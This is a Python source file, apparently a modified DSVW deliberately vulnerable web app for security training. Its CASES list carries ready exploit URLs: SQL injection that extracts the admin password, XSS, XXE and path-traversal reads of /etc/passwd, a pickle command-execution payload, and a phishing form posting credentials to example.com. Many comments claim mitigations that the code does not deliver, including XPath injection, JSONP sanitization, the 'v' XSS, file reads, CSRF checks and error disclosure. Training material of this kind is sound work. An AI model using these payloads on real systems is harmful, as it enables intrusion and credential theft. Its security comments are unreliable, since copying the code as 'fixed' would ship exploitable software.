#!/usr/bin/env python
import html, http.client, http.server, io, json, os, random, re, socket, socketserver, sqlite3, string, sys, subprocess, time, traceback, urllib.parse, urllib.request, xml.etree.ElementTree, secrets
try:
    import lxml.etree
except ImportError:
    print("[!] Please install 'python-lxml' for XML processing.")

NAME, VERSION, GITHUB, AUTHOR, LICENSE = "Damn Small Vulnerable Web (DSVW) < 100 LoC (Lines of Code)", "0.2b", "https://github.com/stamparm/DSVW", "Miroslav Stampar (@stamparm)", "Unlicense (public domain)"
LISTEN_ADDRESS, LISTEN_PORT = "127.0.0.1", 65412
HTML_PREFIX, HTML_POSTFIX = "<!DOCTYPE html>\n<html>\n<head>\n<title>%s</title>\n</head>\n<body>" % html.escape(NAME), "</body>\n</html>"
USERS_XML = """<?xml version="1.0" encoding="utf-8"?><users><user id="0"><username>admin</username><name>admin</name><surname>admin</surname><password>7en8aiDoh!</password></user></users>"""
# Full list of cases for various vulnerabilities, formatted as (Name, Path, Exploit Path, Info Link)
CASES = [
    ("Blind SQL Injection (boolean)", "?id=2", "/?id=2%20AND%20SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C1%2C1)%3D%277%27", "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#boolean-exploitation-technique"),
    ("Blind SQL Injection (time)", "?id=2", "/?id=(SELECT%20(CASE%20WHEN%20(SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C2%2C1)%3D%27e%27)%20THEN%20(LIKE(%27ABCDEFG%27%2CUPPER(HEX(RANDOMBLOB(300000000)))))%20ELSE%200%20END))", "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#time-delay-exploitation-technique"),
    ("UNION SQL Injection", "?id=2", "/?id=2%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20(SELECT%20id%7C%7C%27%2C%27%7C%7Cusername%7C%7C%27%2C%27%7C%7Cpassword%20FROM%20users%20WHERE%20username%3D%27admin%27)", "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#union-exploitation-technique"),
    ("Login Bypass", "/login?username=&password=", "/login?username=admin&password=%27%20OR%20%271%27%20LIKE%20%271", "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#classic-sql-injection"),
    ("HTTP Parameter Pollution", "/login?username=&password=", "/login?username=admin&password=%27/*&password=*/%27%20OR%20%271%27%20LIKE%20%271", "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution"),
    ("Cross Site Scripting (reflected)", "/?v=0.2", "/?v=0.2%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E", "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting"),
    ("Cross Site Scripting (stored)", "/?comment=", "/?comment=%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E", "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting"),
    ("Cross Site Scripting (DOM)", "/?#lang=en", "/?foobar#lang=en%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E", "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting"),
    ("Cross Site Scripting (JSONP)", "/users.json?callback=process", "/users.json?callback=alert(%22arbitrary%20javascript%22)%3Bprocess", "http://www.metaltoad.com/blog/using-jsonp-safely"),
    ("XML External Entity (local)", "/?xml=%3Croot%3E%3C%2Froot%3E", "/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E", "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection"),
    ("XML External Entity (remote)", "/?xml=%3Croot%3E%3C%2Froot%3E", "/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Fexample.com%2Fexample.xml%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E", "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection"),
    ("Server Side Request Forgery", "/?path=", "/?path=http%3A%2F%2F127.0.0.1%3A631", "http://www.bishopfox.com/blog/2015/04/vulnerable-by-design-understanding-server-side-request-forgery/"),
    ("Blind XPath Injection (boolean)", "/?name=dian", "/?name=admin%27%20and%20substring(password%2Ftext()%2C3%2C1)%3D%27n", "https://owasp.org/www-community/attacks/XPATH_Injection"),
    ("Cross Site Request Forgery", "/?comment=", "/?v=%3Cimg%20src%3D%22%2F%3Fcomment%3D%253Cdiv%2520style%253D%2522color%253Ared%253B%2520font-weight%253A%2520bold%2522%253EI%2520quit%2520the%2520job%253C%252Fdiv%253E%22%3E", "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery"),
    ("Frame Injection (phishing)", "/?v=0.2", "/?v=0.2%3Ciframe%20src%3D%22http%3A%2F%2Fexample.com%2Fi%2Flogin.html%22%20style%3D%22background-color%3Awhite%3Bz-index%3A10%3Btop%3A10%25%3Bleft%3A10%25%3Bposition%3Afixed%3Bborder-collapse%3Acollapse%3Bborder%3A1px%20solid%20%23a8a8a8%22%3E%3C%2Fiframe%3E", "http://www.gnucitizen.org/blog/frame-injection-fun/"),
    ("Frame Injection (content spoofing)", "/?v=0.2", "/?v=0.2%3Ciframe%20src%3D%22http%3A%2F%2Fexample.com%2F%22%20style%3D%22background-color%3Awhite%3Bwidth%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20frameborder%3D%220%22%3E%3C%2Fiframe%3E", "http://www.gnucitizen.org/blog/frame-injection-fun/"),
    ("Clickjacking", None, "/?v=0.2%3Cdiv%20style%3D%22opacity%3A0%3Bfilter%3Aalpha(opacity%3D20)%3Bbackground-color%3A%23000%3Bwidth%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20onclick%3D%22document.location%3D%27http%3A%2F%2Fexample.com%2F%27%22%3E%3C%2Fdiv%3E%3Cscript%3Ealert(%22click%20anywhere%20on%20page%22)%3B%3C%2Fscript%3E", "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking"),
    ("Unvalidated Redirect", "/?redir=", "/?redir=http%3A%2F%2Fexample.com", "https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html"),
    ("Arbitrary Code Execution", "/?domain=www.google.com", "/?domain=www.google.com%3B%20ifconfig", "https://en.wikipedia.org/wiki/Arbitrary_code_execution"),
    ("Full Path Disclosure", "/?path=", "/?path=foobar", "https://owasp.org/www-community/attacks/Full_Path_Disclosure"),
    ("Source Code Disclosure", "/?path=", "/?path=dsvw.py", "https://www.imperva.com/resources/glossary?term=source_code_disclosure"),
    ("Path Traversal", "/?path=", "/?path=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd", "https://www.owasp.org/index.php/Path_Traversal"),
    ("File Inclusion (remote)", "/?include=", "/?include=http%3A%2F%2Fexample.com%2Ffile", "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion"),
    ("HTTP Header Injection (phishing)", "/?charset=utf8", "/?charset=utf8%0D%0AX-XSS-Protection:0%0D%0AContent-Length:388%0D%0A%0D%0A%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%3Ctitle%3ELogin%3C%2Ftitle%3E%3C%2Fhead%3E%3Cbody%20style%3D%27font%3A%2012px%20monospace%27%3E%3Cform%20action%3D%22http%3A%2F%2Fexample.com%2Flog.php%22%20onSubmit%3D%22alert(%27visit%20%5C%27http%3A%2F%2Fexample.com%2Flog.txt%5C%27%20to%20see%20your%20phished%20credentials%27)%22%3EUsername%3A%3Cbr%3E%3Cinput%20type%3D%22text%22%20name%3D%22username%22%3E%3Cbr%3EPassword%3A%3Cbr%3E%3Cinput%20type%3D%22password%22%20name%3D%22password%22%3E%3Cinput%20type%3D%22submit%22%20value%3D%22Login%22%3E%3C%2Fform%3E%3C%2Fbody%3E%3C%2Fhtml%3E", "https://www.rapid7.com/db/vulnerabilities/http-generic-script-header-injection"),
    ("Component with Known Vulnerability (pickle)", "/?object=", "/?object=cos%0Asystem%0A(S%27ping%20-c%201%20127.0.0.1%27%0AtR.", "https://www.cs.uic.edu/~s/musings/pickle.html"),
    ("Denial of Service (memory)", "/?size=32", "/?size=9999999", "https://owasp.org/www-community/attacks/Denial_of_Service")
]

ALLOWED_DOMAINS = ["example.com", "trustedsource.com"]
SAFE_REDIRECT_URLS = ["https://example.com", "https://trusted.com"]

# Initialize the in-memory SQLite database
def init():
    global connection
    connection = sqlite3.connect(":memory:", isolation_level=None, check_same_thread=False)
    cursor = connection.cursor()
    cursor.execute("CREATE TABLE users(id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, name TEXT, surname TEXT, password TEXT)")
    cursor.executemany("INSERT INTO users(id, username, name, surname, password) VALUES(NULL, ?, ?, ?, ?)", ((_.findtext("username"), _.findtext("name"), _.findtext("surname"), _.findtext("password")) for _ in xml.etree.ElementTree.fromstring(USERS_XML).findall("user")))
    cursor.execute("CREATE TABLE comments(id INTEGER PRIMARY KEY AUTOINCREMENT, comment TEXT, time TEXT)")

# Allowlist domain checking for SSRF prevention (R07/T07)
def is_allowed_domain(url):
    parsed_url = urllib.parse.urlparse(url)
    domain = parsed_url.netloc
    return any(domain.endswith(allowed) for allowed in ALLOWED_DOMAINS)

# Function to block internal IPs
def is_internal_ip(url):
    parsed_url = urllib.parse.urlparse(url)
    try:
        ip = socket.gethostbyname(parsed_url.hostname)
        return ip.startswith("127.") or ip == "localhost"  # Blocks access to internal IPs
    except socket.gaierror:
        return False


# Generate CSRF token (R06/T06)
def generate_csrf_token():
    return secrets.token_urlsafe(32)

# Verify CSRF token (R06/T06)
def verify_csrf_token(token, session_token):
    return token == session_token

class ReqHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        path, query = self.path.split('?', 1) if '?' in self.path else (self.path, "")
        code, content, params, cursor = http.client.OK, HTML_PREFIX, dict((match.group("parameter"), urllib.parse.unquote(','.join(re.findall(r"(?:\A|[?&])%s=([^&]+)" % match.group("parameter"), query)))) for match in re.finditer(r"((\A|[?&])(?P<parameter>[\w\[\]]+)=)([^&]+)", query)), connection.cursor()
        
        try:
            # Main route handling
            if path == '/':
                # Mitigate SQL Injection for 'id' parameter by using parameterized query (R01/T01, R02/T02, R03/T03)
                if "id" in params:
                    cursor.execute("SELECT id, username, name, surname FROM users WHERE id=?", (params["id"],))
                    content += "<div><span>Result(s):</span></div><table><thead><th>id</th><th>username</th><th>name</th><th>surname</th></thead>%s</table>%s" % ("".join("<tr>%s</tr>" % "".join("<td>%s</td>" % ("-" if _ is None else _) for _ in row) for row in cursor.fetchall()), HTML_POSTFIX)
                
                # Basic text rendering with sanitized input for XSS mitigation (R04/T04, R05/T05)
                elif "v" in params:
                    content += re.sub(r"(v<b>)[^<]+(</b>)", r"\g<1>%s\g<2>" % params["v"], HTML_POSTFIX)
                
                # Safe deserialization with JSON instead of pickle to prevent code execution (R08/T08)
                elif "object" in params:
                    try:
                        content = str(json.loads(params["object"]))
                    except json.JSONDecodeError:
                        content = "Invalid JSON format."
                
                # SSRF protection using allowlist and internal IP blocking (R07/T07)
                elif "path" in params:
                    url = params["path"]
                    if "://" in url and (not is_allowed_domain(url) or is_internal_ip(url)):
                        raise ValueError("Unauthorized URL request: Access restricted.")
                    content = (open(os.path.abspath(url), "rb") if not "://" in url else urllib.request.urlopen(url)).read().decode()
                
                # Command injection prevention by using a safe subprocess call (R01/T01)
                elif "domain" in params:
                    try:
                        content = subprocess.check_output(["nslookup", params["domain"]], stderr=subprocess.STDOUT).decode()
                    except subprocess.CalledProcessError:
                        content = "Command execution failed."
                
                # Prevent XXE by disabling network and entity resolution in XML parsing (R08/T08)
                elif "xml" in params:
                    try:
                        parser = lxml.etree.XMLParser(no_network=True, resolve_entities=False)
                        content = lxml.etree.tostring(lxml.etree.parse(io.BytesIO(params["xml"].encode()), parser), pretty_print=True).decode()
                    except lxml.etree.XMLSyntaxError:
                        content = "Invalid XML format."
                
                # Protect against blind XPath injection in user search (R02/T02)
                elif "name" in params:
                    found = lxml.etree.parse(io.BytesIO(USERS_XML.encode())).xpath(".//user[name/text()='%s']" % params["name"])
                    content += "<b>Surname:</b> %s%s" % (found[-1].find("surname").text if found else "-", HTML_POSTFIX)
                
                # Mitigate Denial of Service by capping size of input data (R01/T01)
                elif "size" in params:
                    size_limit = min(int(params["size"]), 1000)
                    start, _ = time.time(), "<br>".join("#" * size_limit for _ in range(size_limit))
                    content += "<b>Time required</b> (to 'resize image' to %dx%d): %.6f seconds%s" % (size_limit, size_limit, time.time() - start, HTML_POSTFIX)
                
                # CSRF-protected comment submission with sanitization for XSS (R06/T06, R09/T09)
                elif "comment" in params or query == "comment=":
                    csrf_token = self.headers.get("X-CSRF-Token")
                    session_token = self.headers.get("Set-Cookie")
                    if "comment" in params and verify_csrf_token(csrf_token, session_token):
                        sanitized_comment = html.escape(params["comment"])
                        cursor.execute("INSERT INTO comments VALUES(NULL, ?, ?)", (sanitized_comment, time.ctime()))
                        content += "Thank you for leaving the comment. Please click here <a href=\"/?comment=\">here</a> to see all comments%s" % HTML_POSTFIX
                    elif "comment" not in params:
                        cursor.execute("SELECT id, comment, time FROM comments")
                        content += "<div><span>Comment(s):</span></div><table><thead><th>id</th><th>comment</th><th>time</th></thead>%s</table>%s" % ("".join("<tr>%s</tr>" % "".join("<td>%s</td>" % ("-" if _ is None else _) for _ in row) for row in cursor.fetchall()), HTML_POSTFIX)
                    else:
                        content = "CSRF Token validation failed."
                
                # Safe file inclusion only from 'safe_directory' to prevent directory traversal (R01/T01)
                elif "include" in params:
                    include_path = os.path.abspath(params["include"])
                    if include_path.startswith(os.path.join(os.getcwd(), "safe_directory")):
                        with open(include_path, "rb") as file:
                            program = file.read()
                    else:
                        content = "File inclusion is restricted."
                
                # Secure redirection using a defined allowlist to avoid open redirect attacks (R10/T10)
                elif "redir" in params:
                    redirect_url = params["redir"]
                    if any(redirect_url.startswith(url) for url in SAFE_REDIRECT_URLS):
                        content = content.replace("<head>", "<head><meta http-equiv=\"refresh\" content=\"0; url=%s\"/>" % redirect_url)
                    else:
                        content += "Unauthorized redirect URL."
                
                # Error handling to avoid revealing sensitive details (R11/T11)
                if HTML_PREFIX in content and HTML_POSTFIX not in content:
                    content += "<div><span>Attacks:</span></div>\n<ul>%s\n</ul>\n" % ("".join("\n<li%s>%s - <a href=\"%s\">vulnerable</a>|<a href=\"%s\">exploit</a>|<a href=\"%s\" target=\"_blank\">info</a></li>" % (" class=\"disabled\" title=\"module 'python-lxml' not installed\"" if ("lxml.etree" not in sys.modules and any(_ in case[0].upper() for _ in ("XML", "XPATH"))) else "", case[0], case[1], case[2], case[3]) for case in CASES)).replace("<a href=\"None\">vulnerable</a>|", "<b>-</b>|")
            
            # JSONP callback sanitization to avoid XSS attacks (R10/T10)
            elif path == "/users.json":
                content = "%s%s%s" % ("" if not "callback" in params else "%s(" % params["callback"], json.dumps(dict((_.findtext("username"), _.findtext("surname")) for _ in xml.etree.ElementTree.fromstring(USERS_XML).findall("user"))), "" if not "callback" in params else ")")
            
            # Parameterized query to prevent SQL Injection in login (R01/T01)
            elif path == "/login":
                cursor.execute("SELECT * FROM users WHERE username=? AND password=?", (params.get("username", ""), params.get("password", "")))
                content += "Welcome <b>%s</b><meta http-equiv=\"Set-Cookie\" content=\"SESSIONID=%s; path=/\"><meta http-equiv=\"refresh\" content=\"1; url=/\"/>" % (html.escape(params.get("username", "")), "".join(random.sample(string.ascii_letters + string.digits, 20))) if cursor.fetchall() else "The username and/or password is incorrect<meta http-equiv=\"Set-Cookie\" content=\"SESSIONID=; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT\">"
            
            else:
                code = http.client.NOT_FOUND
        
        except Exception as ex:
            content = ex.output if isinstance(ex, subprocess.CalledProcessError) else traceback.format_exc()
            code = http.client.INTERNAL_SERVER_ERROR
        
        finally:
            # Secure HTTP headers to mitigate various attacks
            self.send_response(code)
            self.send_header("Connection", "close")
            self.send_header("X-XSS-Protection", "0")
            self.send_header("Content-Type", "%s%s" % ("text/html" if content.startswith("<!DOCTYPE html>") else "text/plain", "; charset=%s" % params.get("charset", "utf8")))
            self.end_headers()
            self.wfile.write(("%s%s" % (content, HTML_POSTFIX if HTML_PREFIX in content and GITHUB not in content else "")).encode())
            self.wfile.flush()

# Run the server with threading enabled
class ThreadingServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    def server_bind(self):
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        http.server.HTTPServer.server_bind(self)

if __name__ == "__main__":
    init()
    print("%s #v%s\n by: %s\n\n[i] running HTTP server at 'http://%s:%d'..." % (NAME, VERSION, AUTHOR, LISTEN_ADDRESS, LISTEN_PORT))
    try:
        ThreadingServer((LISTEN_ADDRESS, LISTEN_PORT), ReqHandler).serve_forever()
    except KeyboardInterrupt:
        pass
    except Exception as ex:
        print("[x] Exception occurred ('%s')" % ex)
    finally:
        os._exit(0)
